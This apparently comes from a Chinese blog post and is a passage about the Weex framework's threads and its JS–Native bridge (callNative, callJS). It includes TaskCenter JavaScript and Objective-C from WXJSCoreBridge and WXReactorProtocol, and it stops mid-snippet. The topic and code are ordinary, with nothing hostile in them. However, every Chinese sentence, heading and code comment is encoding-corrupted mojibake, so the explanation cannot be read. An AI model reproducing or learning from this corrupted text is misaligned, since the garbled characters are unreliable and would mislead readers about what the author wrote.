<p>æ ¸å¿ƒå®šä½ï¼šWeex çš„ â€œä¸šåŠ¡é€»è¾‘çº¿ç¨‹â€ï¼Œç‹¬ç«‹äºä¸»çº¿ç¨‹ï¼Œä¸“é—¨è¿è¡Œ JavaScript ä»£ç ï¼Œé¿å…é˜»å¡ UIã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>åŠ è½½å¹¶æ‰§è¡Œ Weex ä¸šåŠ¡ä»£ç ï¼ˆ<code>.we</code> ç¼–è¯‘åçš„ JS bundleï¼‰ï¼ŒåŒ…æ‹¬ Vue/React ç»„ä»¶åˆå§‹åŒ–ã€æ•°æ®ç»‘å®šã€ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼›</li>
<li>å¤„ç† JS å±‚é¢çš„ä¸šåŠ¡é€»è¾‘ï¼ˆäº‹ä»¶å“åº”ã€æ•°æ®è®¡ç®—ã€æ¥å£è¯·æ±‚é¢„å¤„ç†ï¼‰ï¼›</li>
<li>è°ƒç”¨åŸç”Ÿæ¨¡å—æ—¶ï¼Œé€šè¿‡ <strong>JSBridge è½¬å‘è¯·æ±‚</strong>ï¼ˆåŒºåˆ†åŒæ­¥ / å¼‚æ­¥ï¼ŒåŒæ­¥è¯·æ±‚ä¼šçŸ­æš‚é˜»å¡ JS çº¿ç¨‹ï¼Œéœ€è°¨æ…ä½¿ç”¨ï¼‰ï¼›</li>
<li>ç”Ÿæˆ UI æ“ä½œæŒ‡ä»¤ï¼ˆå¦‚ <code>createElement</code>ã€<code>updateStyle</code>ï¼‰ï¼Œé€šè¿‡è·¨çº¿ç¨‹é€šä¿¡å‘é€ç»™ä¸»çº¿ç¨‹æ‰§è¡Œï¼›</li>
<li>æ¥æ”¶ä¸»çº¿ç¨‹è½¬å‘çš„ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»å›è°ƒï¼‰ï¼Œæ‰§è¡Œå¯¹åº”çš„ JS äº‹ä»¶å¤„ç†å‡½æ•°ï¼›</li>
</ul>
<p>å…³é”®ä¼˜åŒ–**ï¼šæœ€æ–°ç‰ˆæœ¬ä¸­ï¼ŒJS çº¿ç¨‹æ”¯æŒ <strong>Bundle é¢„åŠ è½½</strong>ã€<strong>æ‡’åŠ è½½ç»„ä»¶</strong>ï¼Œå‡å°‘å¯åŠ¨è€—æ—¶ï¼›åŒæ—¶é€šè¿‡ <code>JSContext</code>éš”ç¦»å¤šä¸ª Weex å®ä¾‹ï¼Œé¿å…çº¿ç¨‹å†…èµ„æºç«äº‰ã€‚</p>
<h3 data-id="heading-39">3. è€—æ—¶çº¿ç¨‹</h3>
<h4 data-id="heading-40">1. ç½‘ç»œçº¿ç¨‹</h4>
<p>æ ¸å¿ƒå®šä½ï¼šWeex æ¡†æ¶å°è£…çš„ <strong>ä¸“ç”¨ç½‘ç»œçº¿ç¨‹</strong>ï¼ˆè·¨ç«¯ç»Ÿä¸€è°ƒåº¦ï¼‰ï¼Œé¿å…ç½‘ç»œè¯·æ±‚é˜»å¡ä¸»çº¿ç¨‹æˆ– JS çº¿ç¨‹ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>å¤„ç† Weex å†…ç½®çš„ç½‘ç»œè¯·æ±‚ï¼ˆå¦‚ <code>weex.requireModule('stream')</code> å‘èµ·çš„ HTTP/HTTPS è¯·æ±‚ï¼‰ï¼›</li>
<li>è´Ÿè´£ JS Bundle çš„ä¸‹è½½ï¼ˆé¦–æ¬¡åŠ è½½æˆ–æ›´æ–°æ—¶ï¼‰ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ ã€ç¼“å­˜ç®¡ç†ï¼›</li>
<li>å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ‹¦æˆªã€é‡è¯•ã€è¶…æ—¶æ§åˆ¶ï¼ˆæ¡†æ¶å±‚ç»Ÿä¸€å®ç°ï¼Œæ— éœ€ä¸šåŠ¡å…³å¿ƒï¼‰ï¼›</li>
<li>å°†ç½‘ç»œå“åº”ç»“æœé€šè¿‡ JSBridge å›ä¼ ç»™ JS çº¿ç¨‹ï¼›</li>
</ul>
<p>è®¾è®¡äº®ç‚¹ï¼šä¸åŸç”Ÿç³»ç»Ÿçš„ç½‘ç»œåº“è§£è€¦ï¼Œä½†å¯¹å¤–æš´éœ²ç»Ÿä¸€çš„ JS APIï¼Œçº¿ç¨‹è°ƒåº¦ç”±æ¡†æ¶å†…éƒ¨ç®¡ç†ï¼Œä¸šåŠ¡æ— éœ€æ‰‹åŠ¨åˆ‡æ¢çº¿ç¨‹</p>
<h4 data-id="heading-41">2. å›¾ç‰‡ä¸‹è½½çº¿ç¨‹</h4>
<p>æ ¸å¿ƒå®šä½ï¼šä¸“é—¨å¤„ç† Weex å›¾ç‰‡çš„å¼‚æ­¥åŠ è½½ã€è§£ç ï¼Œé¿å…å ç”¨ä¸»çº¿ç¨‹èµ„æºå¯¼è‡´ UI å¡é¡¿ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>åŠ è½½ç½‘ç»œå›¾ç‰‡ã€æœ¬åœ°å›¾ç‰‡ï¼ˆé€šè¿‡ <code>img</code> æ ‡ç­¾æˆ– <code>weex.requireModule('image')</code>ï¼‰ï¼›</li>
<li>å›¾ç‰‡è§£ç ã€å‹ç¼©ï¼ˆé€‚é…è§†å›¾å°ºå¯¸ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼‰ï¼›</li>
<li>å›¾ç‰‡ç¼“å­˜ç®¡ç†ï¼ˆå†…å­˜ç¼“å­˜ + ç£ç›˜ç¼“å­˜ï¼Œæ¡†æ¶å±‚ç»Ÿä¸€ç»´æŠ¤ï¼‰ï¼›</li>
<li>åŠ è½½å®Œæˆåï¼Œå°†å›¾ç‰‡ bitmap æäº¤åˆ°ä¸»çº¿ç¨‹æ¸²æŸ“ï¼›</li>
</ul>
<p>iOS ä¾§å›¾ç‰‡åŠ è½½çº¿ç¨‹çš„æ ¸å¿ƒç®¡ç†ç±»æ˜¯ <code>WXImageComponent</code>ã€‚</p>
<p>Weex çº¿ç¨‹èŒè´£è¾¹ç•Œæ¸…æ™°ï¼š<strong>UI æ“ä½œå½’ä¸»çº¿ç¨‹ï¼ŒJS é€»è¾‘å½’ JS çº¿ç¨‹ï¼Œè€—æ—¶æ“ä½œå½’å·¥ä½œçº¿ç¨‹ / ç½‘ç»œçº¿ç¨‹</strong>ï¼Œé¿å…è·¨çº¿ç¨‹ç›´æ¥æ“ä½œèµ„æº</p>
<h2 data-id="heading-42">ä¹ã€JS å’Œ Native é€šä¿¡</h2>
<h3 data-id="heading-43">1. callJS å’Œ callNative</h3>


























<table><thead><tr><th>é€šä¿¡æ–¹å‘</th><th>å‘èµ·æ–¹</th><th>æ¥æ”¶æ–¹</th><th>æ ¸å¿ƒç›®çš„</th><th>å…¸å‹åœºæ™¯</th></tr></thead><tbody><tr><td><code>callNative</code></td><td>JS</td><td>Native</td><td>JS è°ƒç”¨ Native çš„æ¨¡å— / ç»„ä»¶æ¥å£</td><td>æ¸²æŸ“ç»„ä»¶ã€å¼¹ Toastã€è·å–è®¾å¤‡ä¿¡æ¯</td></tr><tr><td><code>callJS</code></td><td>Native</td><td>JS</td><td>Native è§¦å‘ JS çš„å›è°ƒå‡½æ•°</td><td>ç»„ä»¶äº‹ä»¶å›è°ƒï¼ˆå¦‚æŒ‰é’®ç‚¹å‡»ï¼‰ã€æ•°æ®åŒæ­¥ï¼ˆå¦‚ç½‘ç»œè¯·æ±‚ç»“æœï¼‰</td></tr></tbody></table>
<p>ä¸¤è€…çš„åº•å±‚ä¾èµ– <strong>åŒä¸€ä¸ª JS Bridge é€šé“</strong>ï¼Œåªæ˜¯ã€Œå‘èµ·æ–¹ã€å’Œã€Œæ•°æ®æ ¼å¼ã€ä¸åŒï¼ŒWeex å·²å°è£…å¥½ç»Ÿä¸€çš„é€šä¿¡æ¡†æ¶ï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒåº•å±‚ä¼ è¾“ç»†èŠ‚</p>
<h3 data-id="heading-44">2. callNative å®ç°</h3>
<p><code>callNative</code> æ˜¯ JS ä¸»åŠ¨è°ƒç”¨ Native æ¥å£çš„è¿‡ç¨‹ï¼Œæ ¸å¿ƒæµç¨‹ï¼š<strong>JS æ„é€ æ ‡å‡†åŒ–æŒ‡ä»¤ â†’ åºåˆ—åŒ– JSON â†’ æ¡¥æ¥é€šé“å‘é€ â†’ Native è§£ææŒ‡ä»¤ â†’ æ‰§è¡Œå¯¹åº”æ¥å£ â†’ å“åº”ç»“æœå›ä¼ </strong>ã€‚</p>
<p>æ€ä¹ˆæ ·ï¼Ÿæ˜¯ä¸æ˜¯æ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œæ—©æœŸåš Hybrid çš„æ—¶å€™ï¼ŒJS å’Œ Native çš„é€šä¿¡ä¹Ÿæ˜¯ä¸€æ ·çš„æµç¨‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æŸ¥çœ‹<a href="https://link.juejin.cn?target=.%2F1.44.md" target="_blank" title="./1.44.md" ref="nofollow noopener noreferrer">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<p>æ˜¯çš„ï¼Œé€šä¿¡è¦è§£å†³çš„é—®é¢˜ä¸€ç›´ä¸å˜ï¼Œæ‰€ä»¥æ–¹æ¡ˆä¹Ÿä¸å˜ã€‚</p>
<h4 data-id="heading-45">1. æ ‡å‡†åŒ–æŒ‡ä»¤æ ¼å¼</h4>
<p>ä¸ºäº†è®© Native èƒ½ç»Ÿä¸€è§£æï¼ŒWeex è§„å®š <code>callNative</code> çš„æŒ‡ä»¤å¿…é¡»åŒ…å« 4 ä¸ªæ ¸å¿ƒå­—æ®µï¼ˆJS ç«¯æ„é€ ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json">const callNativeæŒ‡ä»¤ = <span class="hljs-punctuation">{</span>
  module<span class="hljs-punctuation">:</span> <span class="hljs-string">"component"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// æ¨¡å—åï¼ˆå¦‚ component/modal/deviceï¼‰</span>
  method<span class="hljs-punctuation">:</span> <span class="hljs-string">"create"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// æ–¹æ³•åï¼ˆå¦‚ create/toast/getInfoï¼‰</span>
  params<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>             <span class="hljs-comment">// å…¥å‚ï¼ˆå¦‚ç»„ä»¶æ ·å¼ã€Toast å†…å®¹ï¼‰</span>
  callbackId<span class="hljs-punctuation">:</span> <span class="hljs-string">"cb_123"</span>    <span class="hljs-comment">// å›è°ƒ IDï¼ˆç”¨äº Native å›ä¼ ç»“æœï¼‰</span>
<span class="hljs-punctuation">}</span>;
</code></pre>
<ul>
<li><code>module</code> + <code>method</code>ï¼šå®šä½ Native ç«¯çš„å…·ä½“æ¥å£ï¼ˆå¦‚ <code>modal.toast</code> å¯¹åº” Native çš„ã€Œå¼¹ Toastã€æ¥å£ï¼‰ï¼›</li>
<li><code>params</code>ï¼šJS ä¼ é€’ç»™ Native çš„æ•°æ®ï¼ˆéœ€æ˜¯ JSON å…¼å®¹ç±»å‹ï¼‰ï¼›</li>
<li><code>callbackId</code>ï¼šå”¯ä¸€æ ‡è¯†å½“å‰è¯·æ±‚ï¼ŒNative æ‰§è¡Œå®Œæˆåé€šè¿‡è¯¥ ID æ‰¾åˆ°å¯¹åº”çš„ JS å›è°ƒå‡½æ•°ã€‚</li>
</ul>
<h4 data-id="heading-46">2. JS ç«¯å®ç°</h4>
<p>JS ä¾§è°ƒç”¨ Native çš„æ ¸å¿ƒæ˜¯3ä¸ªå®ä¾‹æ–¹æ³•ï¼Œå¯¹åº”3ç±»åœºæ™¯</p>

























<table><thead><tr><th>æ–¹æ³•å</th><th>ç”¨é€”</th><th>å¯¹åº” Native æ¥å£</th></tr></thead><tbody><tr><td><code>callModule</code></td><td>è°ƒç”¨ Native æ™®é€šæ¨¡å—ï¼ˆå¦‚ <code>modal</code>/<code>storage</code>ï¼‰</td><td><code>global.callNativeModule</code></td></tr><tr><td><code>callComponent</code></td><td>è°ƒç”¨ Native è‡ªå®šä¹‰ç»„ä»¶æ–¹æ³•</td><td><code>global.callNativeComponent</code></td></tr><tr><td><code>callDOM</code></td><td>è°ƒç”¨ DOM ç›¸å…³ Native æ–¹æ³•ï¼ˆå¦‚åˆ›å»ºå…ƒç´ ï¼‰</td><td><code>global.callAddElement</code> ç­‰ç‹¬ç«‹æ–¹æ³•</td></tr></tbody></table>
<p>è¿™3ä¸ªæ–¹æ³•éƒ½ä¼šé€šè¿‡ Native æ³¨å…¥çš„å…¨å±€å‡½æ•°ï¼ˆglobal ä¸Šçš„æ–¹æ³•ï¼‰å°†è°ƒç”¨ä¼ é€’ç»™ Native å±‚</p>
<p>è¿™3ä¸ªæ–¹æ³•åœ¨æºç æœ€å</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è°ƒç”¨ DOM ç›¸å…³ Native æ–¹æ³•</span>
callDOM (action, args) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[action](<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, args)
}

<span class="hljs-comment">// è°ƒç”¨ Native è‡ªå®šä¹‰ç»„ä»¶æ–¹æ³•</span>
callComponent (ref, method, args, options) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">componentHandler</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, ref, method, args, options)
}

<span class="hljs-comment">// è°ƒç”¨ Native æ™®é€šæ¨¡å—æ–¹æ³•ï¼ˆæœ€å¸¸ç”¨ï¼Œå¯¹åº”åŸ callNativeï¼‰</span>
callModule (<span class="hljs-variable language_">module</span>, method, args, options) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">moduleHandler</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instanceId</span>, <span class="hljs-variable language_">module</span>, method, args, options)
}
</code></pre>
<h5 data-id="heading-47">1. æ™®é€šæ¨¡å—è°ƒç”¨ callModule â†’ moduleHandler</h5>
<p><code>moduleHandler</code> æ˜¯æ™®é€šæ¨¡å—è°ƒç”¨çš„æœ€ç»ˆè½¬å‘å‡½æ•°ï¼Œæºç ä¸­é€šè¿‡ <code>global.callNativeModule</code> å¯¹æ¥ Nativeï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">proto.<span class="hljs-property">moduleHandler</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">callNativeModule</span> ||
    (<span class="hljs-function">(<span class="hljs-params">id, <span class="hljs-variable language_">module</span>, method, args</span>) =&gt;</span>
      <span class="hljs-title function_">fallback</span>(id, [{ <span class="hljs-variable language_">module</span>, method, args }]))
</code></pre>
<ul>
<li>æ­£å¸¸æƒ…å†µï¼ˆå®¢æˆ·ç«¯ç¯å¢ƒï¼‰ï¼š<code>global.callNativeModule</code> æ˜¯ <strong>Native æ³¨å…¥åˆ° JS å…¨å±€çš„å‡½æ•°</strong>ï¼ˆiOS/Android åŸç”Ÿå®ç°ï¼‰ï¼Œç›´æ¥æ¥æ”¶ <code>instanceId</code>ã€æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ï¼Œä¼ é€’ç»™ Native å±‚ã€‚</li>
<li>é™çº§æƒ…å†µï¼ˆæ—  Native æ¡¥æ¥ï¼‰ï¼šè°ƒç”¨ <code>fallback</code> å‡½æ•°ï¼ˆåˆå§‹åŒ–æ—¶ç”± <code>sendTasks</code> å‚æ•°ä¼ å…¥ï¼Œé€šå¸¸ç”¨äºè°ƒè¯• / æ¨¡æ‹Ÿï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-48">2. è‡ªå®šä¹‰ç»„ä»¶è°ƒç”¨ callComponent â†’ componentHandler</h5>
<p>é€»è¾‘ä¸ <code>moduleHandler</code> ä¸€è‡´ï¼Œå¯¹æ¥ <code>global.callNativeComponent</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">proto.<span class="hljs-property">componentHandler</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">callNativeComponent</span> ||
  (<span class="hljs-function">(<span class="hljs-params">id, ref, method, args, options</span>) =&gt;</span>
    <span class="hljs-title function_">fallback</span>(id, [{ <span class="hljs-attr">component</span>: options.<span class="hljs-property">component</span>, ref, method, args }]))
</code></pre>
<h5 data-id="heading-49">3. DOM æ–¹æ³•è°ƒç”¨ callDOM â†’ ç‹¬ç«‹å…¨å±€å‡½æ•°æ˜ å°„</h5>
<p>DOM ç›¸å…³çš„ Native æ–¹æ³•ï¼ˆå¦‚ <code>addElement</code>/<code>updateStyle</code>ï¼‰è¢«å•ç‹¬æ˜ å°„åˆ° <code>global</code> ä¸Šçš„ç‹¬ç«‹å‡½æ•°ï¼ˆè€Œéç»Ÿä¸€çš„ <code>callNative</code>ï¼‰ï¼Œæºç é€šè¿‡ <code>init</code> å‡½æ•°åˆå§‹åŒ–æ˜ å°„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æºç ç¬¬ 116-138 è¡Œï¼šDOM æ–¹æ³•ä¸ Native å…¨å±€å‡½æ•°çš„æ˜ å°„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span> () {
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DOM_METHODS</span> = {
    <span class="hljs-attr">createFinish</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callCreateFinish</span>,
    <span class="hljs-attr">addElement</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callAddElement</span>, <span class="hljs-comment">// DOM åˆ›å»ºå…ƒç´  â†’ Native çš„ callAddElement</span>
    <span class="hljs-attr">removeElement</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callRemoveElement</span>, <span class="hljs-comment">// DOM åˆ é™¤å…ƒç´  â†’ Native çš„ callRemoveElement</span>
    <span class="hljs-attr">updateAttrs</span>: <span class="hljs-variable language_">global</span>.<span class="hljs-property">callUpdateAttrs</span>, <span class="hljs-comment">// æ›´æ–°å±æ€§ â†’ Native çš„ callUpdateAttrs</span>
    <span class="hljs-comment">// ... å…¶ä»– DOM æ–¹æ³•</span>
  }
  <span class="hljs-keyword">const</span> proto = <span class="hljs-title class_">TaskCenter</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>

  <span class="hljs-comment">// ç»™ TaskCenter åŸå‹æŒ‚è½½ DOM æ–¹æ³•ï¼Œç›´æ¥è°ƒç”¨ Native æ³¨å…¥çš„å…¨å±€å‡½æ•°</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">in</span> <span class="hljs-variable constant_">DOM_METHODS</span>) {
    <span class="hljs-keyword">const</span> method = <span class="hljs-variable constant_">DOM_METHODS</span>[name]
    proto[name] = method ?
      <span class="hljs-function">(<span class="hljs-params">id, args</span>) =&gt;</span> <span class="hljs-title function_">method</span>(id, ...args) : <span class="hljs-comment">// æ­£å¸¸æƒ…å†µï¼šè°ƒç”¨ Native å…¨å±€å‡½æ•°</span>
      <span class="hljs-function">(<span class="hljs-params">id, args</span>) =&gt;</span> <span class="hljs-title function_">fallback</span>(...) <span class="hljs-comment">// é™çº§æƒ…å†µ</span>
  }
}
</code></pre>
<p>ä¾‹å¦‚è°ƒç”¨ <code>callDOM('addElement', args)</code> æ—¶ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ <code>global.callAddElement(instanceId, ...args)</code>ï¼Œç›´æ¥å¯¹æ¥ Native çš„ DOM æ¨¡å—ã€‚å…¶å®æ˜¯æ³¨å…¥åˆ° JSContext é‡Œçš„æ–¹æ³•å¯¹è±¡ã€‚</p>
<p>åœ¨ Weex çš„ JS è¿è¡Œç¯å¢ƒä¸­ï¼Œ<code>global</code> æ˜¯ <strong>JS å…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰</strong>â€”â€” å®ƒæ˜¯æ‰€æœ‰ JS ä»£ç çš„ â€œé¡¶å±‚å®¹å™¨â€ï¼Œæ‰€æœ‰æœªè¢«å®šä¹‰åœ¨å±€éƒ¨ä½œç”¨åŸŸçš„å˜é‡ã€å‡½æ•°ï¼Œæœ€ç»ˆéƒ½ä¼šæŒ‚è½½åˆ° <code>global</code> ä¸Šï¼ˆç±»ä¼¼æµè§ˆå™¨ç¯å¢ƒçš„ <code>window</code>ï¼ŒNode.js ç¯å¢ƒçš„ <code>global</code>ï¼‰</p>
<p><strong>Native å‘ JS å¼•æ“çš„ â€œå…¨å±€ä¸Šä¸‹æ–‡â€ æ³¨å…¥ <code>callAddElement</code> å‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°ä¼šè‡ªåŠ¨æˆä¸º <code>global</code> å¯¹è±¡çš„å±æ€§</strong>â€”â€”JS ä¾§çš„ <code>global.callAddElement</code>ï¼Œæœ¬è´¨å°±æ˜¯è®¿é—®è¿™ä¸ªè¢« Native æ³¨å…¥åˆ°å…¨å±€çš„å‡½æ•°ã€‚</p>
<p>QAï¼šglobal æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>æ˜¯ JS å…¨å±€å¯¹è±¡ã€‚ä¸ç®¡æ˜¯æµè§ˆå™¨ã€Node.js è¿˜æ˜¯ Weex çš„ JS å¼•æ“ï¼ˆJavaScriptCore/QuickJSï¼‰ï¼Œéƒ½æœ‰ä¸€ä¸ª <strong>å…¨å±€å¯¹è±¡ï¼ˆGlobal Objectï¼‰</strong>ï¼š</p>
<ul>
<li>å®ƒæ˜¯ JS è¿è¡Œç¯å¢ƒçš„ â€œæ ¹â€ï¼Œæ‰€æœ‰å…¨å±€å˜é‡ã€å‡½æ•°éƒ½æ˜¯å®ƒçš„å±æ€§ï¼›</li>
<li>ä¸åŒç¯å¢ƒçš„å…¨å±€å¯¹è±¡åç§°ä¸åŒï¼š
<ul>
<li>æµè§ˆå™¨ç¯å¢ƒï¼šå« <code>window</code>ï¼ˆæ¯”å¦‚ <code>window.alert</code>ã€<code>window.document</code>ï¼‰ï¼›</li>
<li>Node.js ç¯å¢ƒï¼šå« <code>global</code>ï¼ˆæ¯”å¦‚ <code>global.console</code>ã€<code>global.setTimeout</code>ï¼‰ï¼›</li>
<li>Weex ç¯å¢ƒï¼šå« <code>global</code>ï¼ˆå› ä¸º Weex ä¸ä¾èµ–æµè§ˆå™¨ï¼Œæ²¡æœ‰ <code>window</code>ï¼Œç›´æ¥ç”¨ JS å¼•æ“åŸç”Ÿçš„å…¨å±€å¯¹è±¡ <code>global</code>ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-objective-c" lang="objective-c">// WXJSCoreBridge.mm
- (void)registerCallAddElement:(WXJSCallAddElement)callAddElement
{
    id callAddElementBlock = ^(JSValue *instanceId, JSValue *ref, JSValue *element, JSValue *index, JSValue *ifCallback) {
        NSString *instanceIdString = [instanceId toString];
        WXSDKInstance *instance = [WXSDKManager instanceForID:instanceIdString];
        if (instance.unicornRender) {
            JSValueRef args[] = {instanceId.JSValueRef, ref.JSValueRef, element.JSValueRef, index.JSValueRef};
            [WXCoreBridge callUnicornRenderAction:instanceIdString
                                           module:"dom"
                                           method:"addElement"
                                          context:[JSContext currentContext]
                                             args:args
                                         argCount:4];
            return [JSValue valueWithInt32:0 inContext:[JSContext currentContext]];
        }

        NSDictionary *componentData = [element toDictionary];
        NSString *parentRef = [ref toString];
        NSInteger insertIndex = [[index toNumber] integerValue];
        if (WXAnalyzerCenter.isInteractionLogOpen) {
            WXLogDebug(@"wxInteractionAnalyzer : [jsengin][addElementStart],%@,%@",instanceIdString,componentData[@"ref"]);
        }
        return [JSValue valueWithInt32:(int32_t)callAddElement(instanceIdString, parentRef, componentData, insertIndex) inContext:[JSContext currentContext]];
    };
    
    _jsContext[@"callAddElement"] = callAddElementBlock;
}
</code></pre>
<p>åœ¨ js ä¾§æ˜¯é€šè¿‡  TaskCenter.js çš„ init æ–¹æ³•ä¸­å®šä¹‰çš„ï¼Œå­˜åœ¨æ˜ å°„å…³ç³»ï¼Œ <code>addElement: global.callAddElement,</code></p>
<h3 data-id="heading-50">3. callJS å®ç°</h3>
<p><code>WXReactorProtocol</code> åè®®ï¼š</p>
<ul>
<li>å®šä¹‰ Native è°ƒç”¨ JS çš„ã€Œæ ‡å‡†æ¥å£ã€ï¼ˆå¦‚è§¦å‘å›è°ƒã€å‘é€äº‹ä»¶ï¼‰ï¼Œä¸å…³å¿ƒåº•å±‚ç”¨å“ªç§ JS å¼•æ“ï¼ˆJavaScriptCore / å…¶ä»–ï¼‰ï¼›</li>
<li>å…·ä½“çš„æ¡¥æ¥ç±»ï¼ˆå¦‚ <code>WXJSCoreBridge</code>ï¼‰éµå®ˆè¿™ä¸ªåè®®ï¼Œå®ç°æ¥å£æ–¹æ³• â€”â€” å³ä½¿æœªæ¥æ›¿æ¢ JS å¼•æ“ï¼Œåªè¦éµå®ˆåè®®ï¼Œä¸Šå±‚ä»£ç ï¼ˆå¦‚ Native æ¨¡å—ã€ç»„ä»¶ï¼‰æ— éœ€ä¿®æ”¹ã€‚</li>
</ul>
<pre><code class="hljs language-objective-c" lang="objective-c">
@class JSContext;

@protocol WXReactorProtocol &lt;NSObject&gt;

@required

/**
Weex should register a JSContext to reactor
*/
- (void)registerJSContext:(NSString *)instanceId;

/**
 Reactor execute js source
*/
- (void)render:(NSString *)instanceId source:(NSString*)source data:(NSDictionary* _Nullable)data;

- (void)unregisterJSContext:(NSString *)instanceId;

/**
 When js call Weex NativeModule, invoke callback function
 
 @param instanceId : weex instance id
 @param callbackId : callback function id
 @param args       : args
*/
- (void)invokeCallBack:(NSString *)instanceId function:(NSString *)callbackId args:(NSArray * _Nullable)args;

/**
Native event to js
 
@param instanceId :   instance id
@param ref        :   node reference
@param event      :   event type
@param args       :   parameters in event object
@param domChanges :  dom value changes, used for two-way data binding
*/
- (void)fireEvent:(NSString *)instanceId ref:(NSString *)ref event:(NSString *)event args:(NSDictionary * _Nullable)args domChanges:(NSDictionary * _Nullable)domChanges;

@end
</code></pre>
<p>Native æ¨¡å—ï¼ˆModule)/ç»„ä»¶(Component) å®Œæˆä»»åŠ¡å -&gt;  <code>WXBridgeManager.callBack(...)</code> â†’ æ„é€  JS è„šæœ¬ï¼ˆè°ƒç”¨ <code>TaskCenter.callback</code>ï¼‰ â†’ <code>WXJSCoreBridge.executeJavascript(...)</code> â†’ JS å¼•æ“æ‰§è¡Œ â†’ <code>TaskCenter.callback</code> å“åº”</p>
<p><code>WXJSCoreBridge</code> æœ¬èº«ä¸ç›´æ¥æ‹¼æ¥å›è°ƒè„šæœ¬ï¼Œè€Œæ˜¯æä¾› <code>executeJavascript:</code> æ–¹æ³•ï¼ˆæºç ç¬¬ 102 è¡Œï¼‰ï¼Œä½œä¸º JS è„šæœ¬æ‰§è¡Œçš„åº•å±‚å…¥å£ï¼›çœŸæ­£çš„è„šæœ¬æ„é€ ï¼Œåœ¨ <code>WXBridgeManager</code> ä¸­</p>
<p>WXBridgeManager äº‹ä»¶å›è°ƒ</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params
{
    [self <span class="hljs-attr">fireEvent</span>:instanceId <span class="hljs-attr">ref</span>:ref <span class="hljs-attr">type</span>:type <span class="hljs-attr">params</span>:params <span class="hljs-attr">domChanges</span>:nil];
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params <span class="hljs-attr">domChanges</span>:(<span class="hljs-title class_">NSDictionary</span> *)domChanges
{
    [self <span class="hljs-attr">fireEvent</span>:instanceId <span class="hljs-attr">ref</span>:ref <span class="hljs-attr">type</span>:type <span class="hljs-attr">params</span>:params <span class="hljs-attr">domChanges</span>:domChanges <span class="hljs-attr">handlerArguments</span>:nil];
}
- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params <span class="hljs-attr">domChanges</span>:(<span class="hljs-title class_">NSDictionary</span> *)domChanges <span class="hljs-attr">handlerArguments</span>:(<span class="hljs-title class_">NSArray</span> *)handlerArguments
{
	   <span class="hljs-comment">// ...</span>
    <span class="hljs-title class_">WXCallJSMethod</span> *method = [[<span class="hljs-title class_">WXCallJSMethod</span> alloc] <span class="hljs-attr">initWithModuleName</span>:nil <span class="hljs-attr">methodName</span>:@<span class="hljs-string">"fireEvent"</span> <span class="hljs-attr">arguments</span>:[<span class="hljs-title class_">WXUtility</span> <span class="hljs-attr">convertContainerToImmutable</span>:args] <span class="hljs-attr">instance</span>:instance];
